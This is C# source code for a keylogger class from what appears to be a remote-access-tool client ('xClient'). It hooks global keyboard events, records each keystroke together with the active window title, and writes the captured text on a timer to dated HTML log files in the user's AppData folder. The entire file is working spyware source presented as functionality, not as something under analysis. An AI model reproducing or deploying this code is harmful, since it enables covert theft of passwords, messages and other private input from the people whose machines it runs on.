using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Ties together the logic used to log keyboard input with the
    /// logic used to manipulate the output
    /// </summary>
    public class Logger : IDisposable
    {
        #region GlobalMembers
        public static Logger Instance;
        private StringBuilder _logFileBuffer;
        private List<Keys> _pressedKeys = new List<Keys>();
        private IKeyboardMouseEvents _mEvents;
        private readonly System.Timers.Timer _timerFlush;
        private string _hWndLastTitle;
        private bool _disposed = false;
        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";
        #endregion

        #region Construction
        /// <summary>
        /// Creates the logging class that provides keylogging functionality.hello?
        /// </summary>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            this._logFileBuffer = new StringBuilder();

            this._timerFlush = new System.Timers.Timer { Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            Unsubscribe();
            Subscribe(Hook.GlobalEvents());

            _timerFlush.Enabled = true;
            _timerFlush.Start();
        }
        #endregion

        #region Deconstruction
        ~Logger()
        {
            // If Dispose() is called, we won't reach here and performance will not be
            // hit. This is here if Dispose() did not get called when it should have.
            // It is a safe-guard because we want to make sure we unsubscribe from these
            // things or the client may not be able to get keystrokes/mouse clicks to any
            // other application (including Windows).
            Dispose(false);
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    if (_timerFlush != null)
                    {
                        _timerFlush.Dispose();
                    }

                    _disposed = true;
                }

                Unsubscribe();
            }
        }
        #endregion

        #region KeyboardEvents
        private void Subscribe(IKeyboardMouseEvents events)
        {
            _mEvents = events;
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown += OnMouseDown;
            //m_Events.MouseUp += OnMouseUp;
            //m_Events.MouseClick += OnMouseClick;
            //m_Events.MouseDoubleClick += OnMouseDoubleClick;

            //m_Events.MouseMove += HookManager_MouseMove;
            //m_Events.MouseWheel += HookManager_MouseWheel;

            //m_Events.MouseDownExt += HookManager_Supress;
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;

            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown -= OnMouseDown;
            //m_Events.MouseUp -= OnMouseUp;
            //m_Events.MouseClick -= OnMouseClick;
            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;

            //m_Events.MouseMove -= HookManager_MouseMove;
            //m_Events.MouseWheel -= HookManager_MouseWheel;

            //m_Events.MouseDownExt -= HookManager_Supress;
            _mEvents.Dispose();
        }

        private void OnKeyDown(object sender, KeyEventArgs e) //Called first
        {
            string _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
            if (!string.IsNullOrEmpty(_hWndTitle))
            {
                // Only write the title to the log file if the names are different.
                if (_hWndTitle != _hWndLastTitle)
                {
                    _hWndLastTitle = _hWndTitle;
                    _logFileBuffer.Append(@"<p class=""h""><br><br>[<i>" + _hWndTitle + "</i>]</p><br>");
                }
            }
            // If modifier keys are still down, the key code provided will
            // be recorded for flushing to the 
            if (_pressedKeys.Contains(Keys.LControlKey)
                || _pressedKeys.Contains(Keys.RControlKey)
                || _pressedKeys.Contains(Keys.LMenu)
                || _pressedKeys.Contains(Keys.RMenu)
                || _pressedKeys.Contains(Keys.LWin)
                || _pressedKeys.Contains(Keys.RWin))
            {
                if (!_pressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
                    _pressedKeys.Add(e.KeyCode);
            }
            else
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                    _pressedKeys.Add(e.KeyCode);

                switch (e.KeyCode) //Process special keys and pass excluded keys to keypress event
                {
                    case Keys.Enter:
                        _logFileBuffer.Append(@"<p class=""h"">(ENTER)</p><br>"); //this could be where the KeyloggerKeys enum would be handy
                        break;
                    case Keys.Space:
                        _logFileBuffer.Append("&nbsp;");
                        break;
                    case Keys.Back:
                        _logFileBuffer.Append(@"<p class=""h"">(BACK)</p>");
                        break;
                    case Keys.Delete:
                        _logFileBuffer.Append(@"<p class=""h"">(DEL)</p>");
                        break;
                    case Keys.Left:
                    case Keys.Right:
                    case Keys.Up:
                    case Keys.Down:
                        _logFileBuffer.Append(@"<p class=""h"">(" + e.KeyCode.ToString() + ")</p>");
                        break;
                    default:
                    {
                        // The keys below are excluded. If it is one of the keys below,
                        // the KeyPress event will handle these characters. If the keys
                        // are not any of those specified below, we can continue.
                        if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
                        || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
                        || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                        || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
                        || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
                        || (e.KeyCode == Keys.CapsLock))))
                        {
                            // The key was not part of the keys that we wish to filter, so
                            // be sure to prevent a situation where multiple keys are pressed.
                            if (!_pressedKeys.Contains(e.KeyCode))
                                _pressedKeys.Add(e.KeyCode);
                        }
                        break;
                    }
                }
            }
        }
        
        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
        {
            //This method should be used to process all of our unicode characters
            _logFileBuffer.Append(Filter(e.KeyChar));
        }

        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
        }
        #endregion

        #region ProcessKeys
        private string Filter(char key)
        {
            switch (key)
            {
                case '<':
                    return "&lt;";
                case '>':
                    return "&gt;";
                case '#':
                    return "&#35;";
                case '&':
                    return "&amp;";
                case '"':
                    return "&quot;";
                case '\'':
                    return "&apos;";
                case ' ': // space is already proccessed by OnKeyDown
                    return string.Empty;
            }
            return key.ToString();
        }

        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                names[i] = keys[i].ToString();
            }

            if (_pressedKeys.Contains(Keys.LControlKey)
                || _pressedKeys.Contains(Keys.RControlKey)
                || _pressedKeys.Contains(Keys.LMenu)
                || _pressedKeys.Contains(Keys.RMenu)
                || _pressedKeys.Contains(Keys.LWin)
                || _pressedKeys.Contains(Keys.RWin))
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (!string.IsNullOrEmpty(names[i]))
                    {
                        if (validSpecialKeys == 0)
                        {
                            specialKeys.AppendFormat(@"<p class=""h"">([{0}] ", names[i]);
                        }
                        else
                        {
                            specialKeys.AppendFormat("+ [{0}]", names[i]);
                        }

                        validSpecialKeys++;
                    }
                }

                // If there are items in the special keys string builder, give it an ending
                // font tag and some trailing white-space.
                if (validSpecialKeys > 0)
                {
                    specialKeys.Append(")</p> ");
                }

                return specialKeys.ToString();
            }
            else
            {
                StringBuilder normalKeys = new StringBuilder();

                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (!string.IsNullOrEmpty(names[i]))
                    {
                        normalKeys.Append(names[i]);
                    }
                }

                return normalKeys.ToString();
            }
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }
        #endregion

        #region ProcessLogs
        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.WriteLine("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");

                                // Write out our coloring scheme that will be used by the elements
                                // generated by the logger, and display paragaphs without line breaks
                                // h = Denotes highlighted text (blue color).
                                sw.WriteLine("<style>.h { color: 0000ff; display: inline; }</style>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }
        #endregion
    }
}